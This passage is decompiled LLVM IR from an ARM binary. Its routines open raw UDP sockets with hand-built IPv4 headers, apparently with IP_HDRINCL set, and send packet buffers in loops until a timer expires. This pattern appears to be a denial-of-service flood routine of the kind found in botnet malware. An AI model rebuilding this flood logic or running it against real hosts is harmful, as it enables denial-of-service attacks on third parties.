  %v3_dcc4 = load i8, i8* %v2_dcc4, align 1
  %tmp51 = icmp ugt i8 %v3_dcc4, 31
  br i1 %tmp51, label %dec_label_pc_dc20, label %dec_label_pc_dcd0

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_dca0
  %v1_dcd0 = add i32 %v0_dcc4, 16
  %v2_dcd0 = inttoptr i32 %v1_dcd0 to i32*
  %v3_dcd0 = load i32, i32* %v2_dcd0, align 4
  store i32 %v3_dcd0, i32* %r4.global-to-local, align 4
  %v0_dcd4 = call i32 @function_105b0()
  store i32 %v0_dcd4, i32* %r0.global-to-local, align 4
  %v0_dcec = load i32, i32* %r5.global-to-local, align 4
  %v1_dcec = add i32 %v0_dcec, 20
  %v2_dcec = inttoptr i32 %v1_dcec to i8*
  %v3_dcec = load i8, i8* %v2_dcec, align 1
  %v4_dcec = zext i8 %v3_dcec to i32
  %v2_dcf4 = call i32 @llvm.bswap.i32(i32 %v3_dcd0)
  %v7_dcf8 = lshr i32 %v0_dcd4, %v4_dcec
  %v8_dcf8 = add i32 %v7_dcf8, %v2_dcf4
  %v1_dd00 = and i32 %v8_dcf8, 65280
  store i32 %v1_dd00, i32* %r0.global-to-local, align 4
  %v2_dd14 = call i32 @llvm.bswap.i32(i32 %v8_dcf8)
  %v2_dd18 = add i32 %v0_dcec, 4
  %v3_dd18 = inttoptr i32 %v2_dd18 to i32*
  store i32 %v2_dd14, i32* %v3_dd18, align 4
  %v0_dd1c = load i32, i32* %r5.global-to-local, align 4
  %v1_dd1c = inttoptr i32 %v0_dd1c to %sockaddr*
  %v0_dd20 = load i32, i32* %r6.global-to-local, align 4
  %v1_dd20 = load i32, i32* @sb, align 4
  %v2_dd20 = add i32 %v1_dd20, %v0_dd20
  %v3_dd20 = inttoptr i32 %v2_dd20 to i32*
  %v4_dd20 = load i32, i32* %v3_dd20, align 4
  store i32 %v4_dd20, i32* %r0.global-to-local, align 4
  %v5_dd28 = call i32 @connect(i32 %v4_dd20, %sockaddr* %v1_dd1c, i32 16)
  store i32 %v5_dd28, i32* %r0.global-to-local, align 4
  %v0_dd2c = load i32, i32* @r8, align 4
  %v1_dd2c = load i32, i32* @sl, align 4
  %v9_dd2c = icmp eq i32 %v0_dd2c, %v1_dd2c
  %v0_dd30 = load i32, i32* %r6.global-to-local, align 4
  %v1_dd30 = add i32 %v0_dd30, 4
  store i32 %v1_dd30, i32* %r6.global-to-local, align 4
  %v0_dd34 = load i32, i32* %r5.global-to-local, align 4
  %v1_dd34 = add i32 %v0_dd34, 24
  store i32 %v1_dd34, i32* %r5.global-to-local, align 4
  br i1 %v9_dd2c, label %dec_label_pc_dd3c, label %dec_label_pc_dc40

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dcd0, %dec_label_pc_dc20, %dec_label_pc_dd80.dec_label_pc_dd3c_crit_edge
  %v0_dd3c = phi i32 [ %v0_dd3c.pre, %dec_label_pc_dd80.dec_label_pc_dd3c_crit_edge ], [ %v0_dd2c, %dec_label_pc_dcd0 ], [ %v0_dc30, %dec_label_pc_dc20 ]
  %tmp49 = icmp slt i32 %v0_dd3c, 1
  br i1 %tmp49, label %dec_label_pc_dd80, label %dec_label_pc_dd44

dec_label_pc_dd44:                                ; preds = %dec_label_pc_dd3c
  %v2_dd48 = icmp eq i32 %v1_dba0, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_dd48, label %dec_label_pc_dd50, label %dec_label_pc_ddc0

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd44
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_dd58

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd58, %dec_label_pc_dd50
  %v0_dd64 = phi i32 [ %v1_dd64, %dec_label_pc_dd58 ], [ 0, %dec_label_pc_dd50 ]
  %v0_dd5c = phi i32 [ %v1_dd78, %dec_label_pc_dd58 ], [ 0, %dec_label_pc_dd50 ]
  %v1_dd5c = load i32, i32* @sb, align 4
  %v2_dd5c = add i32 %v1_dd5c, %v0_dd5c
  %v3_dd5c = inttoptr i32 %v2_dd5c to i32*
  %v4_dd5c = load i32, i32* %v3_dd5c, align 4
  store i32 %v4_dd5c, i32* %r0.global-to-local, align 4
  %v2_dd60 = add i32 %v0_dd5c, %v4_db10
  %v3_dd60 = inttoptr i32 %v2_dd60 to i32*
  %v4_dd60 = load i32, i32* %v3_dd60, align 4
  %v1_dd64 = add i32 %v0_dd64, 1
  store i32 %v1_dd64, i32* %r5.global-to-local, align 4
  %v4_dd70 = inttoptr i32 %v4_dd60 to i32*
  %v5_dd70 = call i32 @send(i32 %v4_dd5c, i32* %v4_dd70, i32 %v3_db84, i32 16384)
  store i32 %v5_dd70, i32* %r0.global-to-local, align 4
  %v1_dd74 = load i32, i32* @sl, align 4
  %v9_dd74 = icmp eq i32 %v1_dd64, %v1_dd74
  %v0_dd78 = load i32, i32* %r4.global-to-local, align 4
  %v1_dd78 = add i32 %v0_dd78, 4
  store i32 %v1_dd78, i32* %r4.global-to-local, align 4
  br i1 %v9_dd74, label %dec_label_pc_dd80, label %dec_label_pc_dd58

dec_label_pc_dd80:                                ; preds = %dec_label_pc_ddcc, %dec_label_pc_dd58, %dec_label_pc_dd3c, %dec_label_pc_dbe0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dd84 = call i32 @time(i32* null)
  store i32 %v2_dd84, i32* %r0.global-to-local, align 4
  %v6_dd90 = icmp slt i32 %v2_dbcc5, %v2_dd84
  br i1 %v6_dd90, label %dec_label_pc_dd94, label %dec_label_pc_dd80.dec_label_pc_dd3c_crit_edge

dec_label_pc_dd80.dec_label_pc_dd3c_crit_edge:    ; preds = %dec_label_pc_dd80
  %v0_dd3c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_dd3c

dec_label_pc_dd94.loopexit:                       ; preds = %dec_label_pc_dc74
  %v29_dd98.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd94

dec_label_pc_dd94:                                ; preds = %dec_label_pc_dd94.loopexit, %dec_label_pc_dd80
  %v29_dd98 = phi i32 [ %v29_dd98.pre, %dec_label_pc_dd94.loopexit ], [ %v2_dd84, %dec_label_pc_dd80 ]
  store i32 %v3_daec, i32* %r4.global-to-local, align 4
  store i32 %v6_daec, i32* %r5.global-to-local, align 4
  store i32 %v9_daec, i32* %r6.global-to-local, align 4
  ret i32 %v29_dd98

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dc40
  %v0_dd9c = call i32 @function_105b0()
  %v1_dd9c = trunc i32 %v0_dd9c to i8
  store i32 %v0_dd9c, i32* %r0.global-to-local, align 4
  %v4_dda0 = sdiv i32 %v0_dd9c, 256
  %v1_dda4 = trunc i32 %v4_dda0 to i8
  %v2_dda4 = load i32, i32* %r5.global-to-local, align 4
  %v3_dda4 = add i32 %v2_dda4, 3
  %v4_dda4 = inttoptr i32 %v3_dda4 to i8*
  store i8 %v1_dda4, i8* %v4_dda4, align 1
  %v3_dda8 = load i32, i32* %r5.global-to-local, align 4
  %v4_dda8 = add i32 %v3_dda8, 2
  %v5_dda8 = inttoptr i32 %v4_dda8 to i8*
  store i8 %v1_dd9c, i8* %v5_dda8, align 1
  br label %dec_label_pc_dc74

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_daec
  %v0_ddb0 = call i32 @function_105b0()
  %v3_ddb4 = mul i32 %v0_ddb0, 65536
  store i32 %v3_ddb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dbe0

dec_label_pc_ddc0:                                ; preds = %dec_label_pc_dd44
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_ddcc, %dec_label_pc_ddc0
  %v0_ddd0 = phi i32 [ %v1_de04, %dec_label_pc_ddcc ], [ 0, %dec_label_pc_ddc0 ]
  %v2_ddd0 = add i32 %v0_ddd0, %v4_db10
  %v3_ddd0 = inttoptr i32 %v2_ddd0 to i32*
  %v4_ddd0 = load i32, i32* %v3_ddd0, align 4
  store i32 %v4_ddd0, i32* @r4, align 4
  store i32 %v4_ddd0, i32* %r0.global-to-local, align 4
  %v2_dddc = call i32 @function_10664(i32 %v4_ddd0, i32 %v3_db84)
  store i32 %v2_dddc, i32* %r0.global-to-local, align 4
  %v0_dde4 = load i32, i32* @r7, align 4
  %v1_dde4 = trunc i32 %v0_dde4 to i8
  %v2_dde4 = load i32, i32* @r4, align 4
  %v4_dde4 = add i32 %v2_dde4, %v3_db84
  %v5_dde4 = inttoptr i32 %v4_dde4 to i8*
  store i8 %v1_dde4, i8* %v5_dde4, align 1
  %v0_dde8 = load i32, i32* @r4, align 4
  %v0_ddec = load i32, i32* @r6, align 4
  %v1_ddec = load i32, i32* @sb, align 4
  %v2_ddec = add i32 %v1_ddec, %v0_ddec
  %v3_ddec = inttoptr i32 %v2_ddec to i32*
  %v4_ddec = load i32, i32* %v3_ddec, align 4
  store i32 %v4_ddec, i32* %r0.global-to-local, align 4
  %v0_ddf0 = load i32, i32* @r5, align 4
  %v1_ddf0 = add i32 %v0_ddf0, 1
  store i32 %v1_ddf0, i32* @r5, align 4
  %v4_ddfc = inttoptr i32 %v0_dde8 to i32*
  %v5_ddfc = call i32 @send(i32 %v4_ddec, i32* %v4_ddfc, i32 %v3_db84, i32 16384)
  store i32 %v5_ddfc, i32* %r0.global-to-local, align 4
  %v0_de00 = load i32, i32* @r5, align 4
  %v1_de00 = load i32, i32* @sl, align 4
  %v9_de00 = icmp eq i32 %v0_de00, %v1_de00
  %v0_de04 = load i32, i32* @r6, align 4
  %v1_de04 = add i32 %v0_de04, 4
  store i32 %v1_de04, i32* @r6, align 4
  br i1 %v9_de00, label %dec_label_pc_dd80, label %dec_label_pc_ddcc

; uselistorder directives
  uselistorder i32 %v1_de04, { 1, 0 }
  uselistorder i32 %v0_dd9c, { 0, 2, 1 }
  uselistorder i32 %v1_dd78, { 1, 0 }
  uselistorder i32 %v1_dd64, { 0, 2, 1 }
  uselistorder i32 %v0_dcc4, { 1, 2, 0 }
  uselistorder i32 %v3_dc80, { 1, 0, 2 }
  uselistorder i32 %v3_db84, { 2, 3, 1, 0 }
  uselistorder i32 %v1_daf0, { 1, 2, 0 }
  uselistorder i8* %stack_var_-84, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 4, 7, 8, 2, 5, 6, 9 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 6, 7, 8, 10, 11, 12, 3, 9, 13 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 6, 4, 5, 7, 20, 9, 8, 11, 10, 14, 12, 13, 15, 18, 21, 22, 19, 24, 23, 17, 16, 1, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder label %dec_label_pc_dd3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbe0, { 1, 0 }
}

define i32 @function_de10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_de10:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_de10 = load i32, i32* @r4, align 4
  %v6_de10 = load i32, i32* @r5, align 4
  %v9_de10 = load i32, i32* @r6, align 4
  %v12_de10 = load i32, i32* @r7, align 4
  %v18_de10 = load i32, i32* @sb, align 4
  %v21_de10 = load i32, i32* @sl, align 4
  %v1_de14 = urem i32 %arg2, 256
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v1_de14, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_de30 = urem i32 %arg4, 256
  store i32 %v1_de30, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_de40 = call i32* @calloc(i32 %v1_de14, i32 4)
  %v4_de40 = ptrtoint i32* %v2_de40 to i32
  %v0_de44 = load i32, i32* @r5, align 4
  store i32 %v0_de44, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_de50 = load i32, i32* @r7, align 4
  store i32 %v0_de50, i32* %r3.global-to-local, align 4
  %v0_de54 = load i32, i32* @r4, align 4
  store i32 %v0_de54, i32* %r0.global-to-local, align 4
  %v5_de58 = inttoptr i32 %v0_de44 to i32*
  %v6_de58 = call i32 @function_ad24(i32 %v0_de54, i32* %v5_de58, i32 2, i32 %v0_de50)
  %v1_de64 = urem i32 %v6_de58, 256
  store i32 %v1_de64, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_de70 = load i32, i32* @r5, align 4
  store i32 %v0_de70, i32* %r1.global-to-local, align 4
  %v0_de74 = load i32, i32* @r4, align 4
  store i32 %v0_de74, i32* %r0.global-to-local, align 4
  %v5_de78 = trunc i32 %v6_de58 to i8
  %v6_de7c = inttoptr i32 %v0_de70 to i32*
  %v7_de7c = call i32 @function_ad24(i32 %v0_de74, i32* %v6_de7c, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_de80 = load i32, i32* @r5, align 4
  store i32 %v0_de80, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_de90 = load i32, i32* @r4, align 4
  store i32 %v0_de90, i32* %r0.global-to-local, align 4
  %v5_de94 = inttoptr i32 %v0_de80 to i32*
  %v6_de94 = call i32 @function_ad24(i32 %v0_de90, i32* %v5_de94, i32 4, i32 64)
  %v1_de9c = urem i32 %v6_de94, 256
  store i32 %v1_de9c, i32* %ip.global-to-local, align 4
  %v0_dea0 = load i32, i32* @r5, align 4
  store i32 %v0_dea0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_dea8 = load i32, i32* @r7, align 4
  store i32 %v0_dea8, i32* %r3.global-to-local, align 4
  %v0_deac = load i32, i32* @r4, align 4
  store i32 %v0_deac, i32* %r0.global-to-local, align 4
  %v5_deb0 = trunc i32 %v6_de94 to i8
  %v6_deb4 = inttoptr i32 %v0_dea0 to i32*
  %v7_deb4 = call i32 @function_ad24(i32 %v0_deac, i32* %v6_deb4, i32 5, i32 %v0_dea8)
  %v1_dec0 = urem i32 %v7_deb4, 256
  store i32 %v1_dec0, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_decc = load i32, i32* @r5, align 4
  store i32 %v0_decc, i32* %r1.global-to-local, align 4
  %v0_ded0 = load i32, i32* @r4, align 4
  store i32 %v0_ded0, i32* %r0.global-to-local, align 4
  %v5_ded8 = inttoptr i32 %v0_decc to i32*
  %v6_ded8 = call i32 @function_ad24(i32 %v0_ded0, i32* %v5_ded8, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_dee4 = load i32, i32* @r5, align 4
  store i32 %v0_dee4, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_def0 = load i32, i32* @r4, align 4
  store i32 %v0_def0, i32* %r0.global-to-local, align 4
  %v5_def4 = inttoptr i32 %v0_dee4 to i32*
  %v6_def4 = call i32 @function_ad24(i32 %v0_def0, i32* %v5_def4, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_def8 = load i32, i32* @r5, align 4
  store i32 %v0_def8, i32* %r1.global-to-local, align 4
  %v0_defc = load i32, i32* @r7, align 4
  store i32 %v0_defc, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_def4, i32* %sb.global-to-local, align 4
  %v0_df08 = load i32, i32* @r4, align 4
  store i32 %v0_df08, i32* %r0.global-to-local, align 4
  %v4_df0c = inttoptr i32 %v0_def8 to i32*
  %v5_df0c = call i32 @function_ad24(i32 %v0_df08, i32* %v4_df0c, i32 %v0_defc, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_df18 = load i32, i32* @r5, align 4
  store i32 %v0_df18, i32* %r1.global-to-local, align 4
  store i32 %v5_df0c, i32* @sl, align 4
  %v0_df20 = load i32, i32* @r4, align 4
  store i32 %v0_df20, i32* %r0.global-to-local, align 4
  %v4_df24 = inttoptr i32 %v0_df18 to i32*
  %v5_df24 = call i32 @function_ad24(i32 %v0_df20, i32* %v4_df24, i32 1, i32 1)
  %v2_df30 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_df30, i32* %r3.global-to-local, align 4
  %v1_df34 = urem i32 %v5_df24, 256
  store i32 %v1_df34, i32* %ip.global-to-local, align 4
  %v0_df38 = load i32, i32* @r5, align 4
  store i32 %v0_df38, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_df40 = load i32, i32* @r4, align 4
  store i32 %v0_df40, i32* %r0.global-to-local, align 4
  %v5_df48 = inttoptr i32 %v0_df38 to i32*
  %v6_df48 = call i32 @function_ad24(i32 %v0_df40, i32* %v5_df48, i32 24, i32 %v2_df30)
  store i32 %v6_df48, i32* @fp, align 4
  %v0_df50 = load i32, i32* @r7, align 4
  store i32 %v0_df50, i32* %r0.global-to-local, align 4
  %v1_df54 = inttoptr i32 %v0_df50 to i32*
  %v2_df54 = call i32 @time(i32* %v1_df54)
  %v1_df58 = load i32, i32* @r6, align 4
  %v2_df58 = add i32 %v1_df58, %v2_df54
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_df6c = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_df6c, i32* %r0.global-to-local, align 4
  %v7_df70 = icmp eq i32 %v3_df6c, -1
  store i1 %v7_df70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_df70, label %dec_label_pc_e398, label %dec_label_pc_df7c

dec_label_pc_df7c:                                ; preds = %dec_label_pc_de10
  store i32 1, i32* %stack_var_-40, align 4
  %v6_df84 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_df84, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_df8c = load i32, i32* @r7, align 4
  store i32 %v0_df8c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_df98 = call i32 @setsockopt(i32 %v3_df6c, i32 %v0_df8c, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_df98, i32* %r0.global-to-local, align 4
  %v7_df9c = icmp eq i32 %v7_df98, -1
  store i1 %v7_df9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_df9c, label %dec_label_pc_e3a0, label %dec_label_pc_dfa4

dec_label_pc_dfa4:                                ; preds = %dec_label_pc_df7c
  %v0_dfa4 = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_dfb0 = urem i32 %v0_dfa4, 65536
  store i32 %v3_dfb0, i32* %r2.global-to-local, align 4
  %v3_dfb4 = icmp ugt i32 %v3_dfb0, 1459
  %v9_dfb4 = icmp eq i32 %v3_dfb0, 1460
  store i1 %v9_dfb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dfb4, label %bb, label %bb57

bb:                                               ; preds = %dec_label_pc_dfa4
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_dfa4, %bb
  %v0_dfbc = phi i32 [ %v3_dfb0, %dec_label_pc_dfa4 ], [ 1460, %bb ]
  store i32 %v7_de7c, i32* %r1.global-to-local, align 4
  store i32 %v6_ded8, i32* %r2.global-to-local, align 4
  store i32 %v1_de14, i32* %r3.global-to-local, align 4
  %v0_dfcc = load i32, i32* %sb.global-to-local, align 4
  %v3_dfcc = mul i32 %v0_dfcc, 65536
  store i32 %v3_dfcc, i32* %r6.global-to-local, align 4
  %v3_dfd0 = mul i32 %v7_de7c, 65536
  store i32 %v3_dfd0, i32* %r0.global-to-local, align 4
  %v3_dfd4 = mul i32 %v6_ded8, 65536
  store i32 %v3_dfd4, i32* %sl.global-to-local, align 4
  %v3_dfd8 = urem i32 %v7_de7c, 65536
  store i32 %v3_dfd8, i32* %r4.global-to-local, align 4
  %v3_dfdc = urem i32 %v6_ded8, 65536
  store i32 %v3_dfdc, i32* %sb.global-to-local, align 4
  %v3_dfe0 = urem i32 %v0_dfcc, 65536
  store i32 %v3_dfe0, i32* %ip.global-to-local, align 4
  %v2_dfe4 = icmp eq i32 %v1_de14, 0
  store i1 %v2_dfe4, i1* %cpsr_z.global-to-local, align 1
  %v0_dfe8 = load i32, i32* @r7, align 4
  store i32 %v0_dfe8, i32* %stack_var_-40, align 4
  br i1 %v2_dfe4, label %.dec_label_pc_e158.preheader_crit_edge, label %dec_label_pc_dffc

.dec_label_pc_e158.preheader_crit_edge:           ; preds = %bb57
  %.pre = add nuw nsw i32 %v0_dfbc, 8
  %.pre20 = add nuw nsw i32 %v0_dfbc, 28
  br label %dec_label_pc_e158.preheader

dec_label_pc_dffc:                                ; preds = %bb57
  %v1_e000 = add nuw nsw i32 %v0_dfbc, 28
  %v1_e004 = add nuw nsw i32 %v0_dfbc, 8
  %v1_e008 = urem i32 %v6_ded8, 256
  %tmp58 = udiv i32 %v7_de7c, 256
  %v3_e014 = urem i32 %tmp58, 256
  %tmp59 = mul nuw nsw i32 %v1_e000, 256
  %v1_e024 = urem i32 %v7_de7c, 256
  %tmp60 = mul nuw nsw i32 %v1_e004, 256
  %v1_e030 = and i32 %tmp59, 65280
  store i32 %v1_e030, i32* %r3.global-to-local, align 4
  %v4_e034 = mul nuw nsw i32 %v1_e024, 256
  %v5_e034 = or i32 %v4_e034, %v3_e014
  store i32 %v5_e034, i32* %r0.global-to-local, align 4
  %v3_e038 = mul nuw nsw i32 %v1_e008, 256
  store i32 %v3_e038, i32* %r1.global-to-local, align 4
  %tmp61 = udiv i32 %v0_dfcc, 256
  %v3_e03c = urem i32 %tmp61, 256
  %v1_e040 = and i32 %tmp60, 65280
  store i32 %v1_e040, i32* %ip.global-to-local, align 4
  %v2_e044 = icmp eq i32 %v1_dec0, 0
  store i1 %v2_e044, i1* %cpsr_z.global-to-local, align 1
  %tmp62 = udiv i32 %v1_e000, 256
  %v4_e048 = urem i32 %tmp62, 256
  %v5_e048 = or i32 %v4_e048, %v1_e030
  store i32 %v5_e048, i32* %r2.global-to-local, align 4
  %v1_e04c = urem i32 %v0_dfcc, 256
  store i32 %v1_e04c, i32* %r4.global-to-local, align 4
  %v5_e050 = trunc i32 %tmp62 to i8
  %v5_e054 = trunc i32 %tmp58 to i8
  %tmp63 = udiv i32 %v6_ded8, 256
  %v4_e058 = urem i32 %tmp63, 256
  %v5_e058 = or i32 %v4_e058, %v3_e038
  store i32 %v5_e058, i32* %r5.global-to-local, align 4
  %v4_e05c = mul nuw nsw i32 %v1_e04c, 256
  %v5_e05c = or i32 %v4_e05c, %v3_e03c
  store i32 %v5_e05c, i32* %r6.global-to-local, align 4
  %tmp64 = udiv i32 %v1_e004, 256
  %v4_e060 = urem i32 %tmp64, 256
  %v5_e060 = or i32 %v4_e060, %v1_e040
  store i32 %v5_e060, i32* %sb.global-to-local, align 4
  br i1 %v2_e044, label %dec_label_pc_e068, label %dec_label_pc_e3ac

dec_label_pc_e068:                                ; preds = %dec_label_pc_dffc
  %v3_e06823 = udiv i32 %v1_e030, 256
  store i32 %v3_e06823, i32* %ip.global-to-local, align 4
  store i32 %v1_e024, i32* %r0.global-to-local, align 4
  store i32 %v1_e008, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e04c, i32* %sl.global-to-local, align 4
  %v3_e08824 = udiv i32 %v1_e040, 256
  store i32 %v3_e08824, i32* %r7.global-to-local, align 4
  %v4_e0d8 = sext i8 %v5_de78 to i32
  %v4_e0e0 = sext i8 %v5_deb0 to i32
  %sext11 = mul i32 %v1_e000, 16777216
  %v4_e110 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v7_de7c, 16777216
  %v4_e11c = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v6_ded8, 16777216
  %v4_e120 = sdiv i32 %sext13, 16777216
  %v4_e128 = sext i8 %v5_e054 to i32
  %v4_e104 = sext i8 %v5_e050 to i32
  br label %dec_label_pc_e08c

dec_label_pc_e08c:                                ; preds = %dec_label_pc_e08c, %dec_label_pc_e068
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e098 = call i32* @calloc(i32 1510, i32 1)
  %v4_e098 = ptrtoint i32* %v2_e098 to i32
  store i32 %v4_e098, i32* %r0.global-to-local, align 4
  store i32 %v4_de40, i32* %r3.global-to-local, align 4
  %v2_e0a4 = load i32, i32* %r4.global-to-local, align 4
  %v5_e0a4 = mul i32 %v2_e0a4, 4
  %v6_e0a4 = add i32 %v5_e0a4, %v4_de40
  %v7_e0a4 = inttoptr i32 %v6_e0a4 to i32*
  store i32 %v4_e098, i32* %v7_e0a4, align 4
  %v3_e0a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e0a8, i32* %r2.global-to-local, align 4
  %v0_e0ac = load i32, i32* %r3.global-to-local, align 4
  %v4_e0ac = mul i32 %v3_e0a8, 4
  %v5_e0ac = add i32 %v0_e0ac, %v4_e0ac
  %v6_e0ac = inttoptr i32 %v5_e0ac to i32*
  %v7_e0ac = load i32, i32* %v6_e0ac, align 4
  store i32 %v7_e0ac, i32* %r1.global-to-local, align 4
  %v1_e0b0 = inttoptr i32 %v7_e0ac to i8*
  %v2_e0b0 = load i8, i8* %v1_e0b0, align 1
  %tmp = urem i8 %v2_e0b0, 16
  %v1_e0b4 = zext i8 %tmp to i32
  %v1_e0b8 = or i32 %v1_e0b4, 64
  store i32 %v1_e0b8, i32* %r3.global-to-local, align 4
  %v1_e0bc = trunc i32 %v1_e0b8 to i8
  store i8 %v1_e0bc, i8* %v1_e0b0, align 1
  %v0_e0c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0c0 = inttoptr i32 %v0_e0c0 to i8*
  %v2_e0c0 = load i8, i8* %v1_e0c0, align 1
  %v3_e0c0 = zext i8 %v2_e0c0 to i32
  %v1_e0c4 = and i32 %v3_e0c0, 240
  %v1_e0c8 = or i32 %v1_e0c4, 5
  store i32 %v1_e0c8, i32* %r2.global-to-local, align 4
  %v3_e0d0 = add i32 %v0_e0c0, 9
  %v4_e0d0 = inttoptr i32 %v3_e0d0 to i8*
  store i8 17, i8* %v4_e0d0, align 1
  %v0_e0d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0d4 = trunc i32 %v0_e0d4 to i8
  %v2_e0d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0d4 = inttoptr i32 %v2_e0d4 to i8*
  store i8 %v1_e0d4, i8* %v3_e0d4, align 1
  store i32 %v4_e0d8, i32* %r4.global-to-local, align 4
  %v2_e0dc = load i32, i32* %r1.global-to-local, align 4
  %v3_e0dc = add i32 %v2_e0dc, 1
  %v4_e0dc = inttoptr i32 %v3_e0dc to i8*
  store i8 %v5_de78, i8* %v4_e0dc, align 1
  store i32 %v4_e0e0, i32* %ip.global-to-local, align 4
  %v2_e0e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0e4 = add i32 %v2_e0e4, 8
  %v4_e0e4 = inttoptr i32 %v3_e0e4 to i8*
  store i8 %v5_deb0, i8* %v4_e0e4, align 1
  %v3_e0e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e0e8, i32* %r2.global-to-local, align 4
  %v3_e0ec = mul i32 %v3_e0e8, 32
  store i32 %v3_e0ec, i32* %r3.global-to-local, align 4
  %v0_e0f0 = load i32, i32* @fp, align 4
  %v1_e0f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e0f0 = add i32 %v1_e0f0, 12
  %v3_e0f0 = inttoptr i32 %v2_e0f0 to i32*
  store i32 %v0_e0f0, i32* %v3_e0f0, align 4
  %v0_e0f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e0f4 = load i32, i32* %r2.global-to-local, align 4
  %tmp67 = mul i32 %v1_e0f4, -8
  %v5_e0f4 = add i32 %v0_e0f4, %tmp67
  %v1_e0f8 = load i32, i32* @r8, align 4
  %v2_e0f8 = add i32 %v5_e0f4, %v1_e0f8
  store i32 %v2_e0f8, i32* %r3.global-to-local, align 4
